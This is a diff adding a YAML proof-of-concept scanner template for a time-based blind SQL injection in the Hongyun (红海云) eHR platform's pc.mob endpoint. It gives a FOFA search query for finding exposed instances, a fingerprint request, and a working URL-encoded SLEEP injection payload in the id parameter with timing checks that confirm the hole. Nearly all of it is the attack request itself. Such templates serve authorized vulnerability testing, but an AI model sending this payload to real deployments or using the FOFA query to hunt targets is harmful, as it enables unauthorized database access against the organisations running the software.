@@ -1,0 +1,20 @@
+id: poc-yaml-hr-soft-pc-mob-sqli
+info:
+  name: 红海云eHR pc.mob SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 红海云eHR
+  fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /RedseaPlatform/
+  expression: status_code == 200 && contains(body,"/RedseaPlatform/skins/images/favicon.ico")
+- method: GET
+  path: /RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP({{.t1}})))ndMq)%20AND%20%27NEoX%27=%27NEoX
+  expression: "status_code == 200 && \nbody == \"\" &&\nduration > t1 &&\nduration\
+    \ < t2\n"
+transport: http
